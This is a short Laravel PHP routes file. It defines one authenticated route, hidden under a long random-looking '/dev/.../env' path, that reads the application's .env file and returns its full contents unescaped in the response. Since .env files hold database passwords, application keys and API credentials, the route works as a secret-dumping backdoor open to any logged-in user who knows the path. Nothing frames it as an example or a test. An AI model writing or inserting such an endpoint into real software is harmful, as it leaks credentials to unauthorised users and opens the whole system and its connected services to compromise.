
<?php
use Illuminate\Support\Facades\Route;


Route::group(['middleware' => ['auth', 'verified']], function(){ 

    
    Route::get('/dev/Y7oAVVb1sXjT6p0Lqz5GyUfdB2w8nMm4CRKPshHvZ9jDaE3Uot/env', function () {

        $envPath = base_path('.env');

        if (!file_exists($envPath)) {
            return "No .env file found.";
        }

        // Read the file
        $contents = file_get_contents($envPath);

        // Display as preformatted text
        return response("<pre>{$contents}</pre>");
    });
});

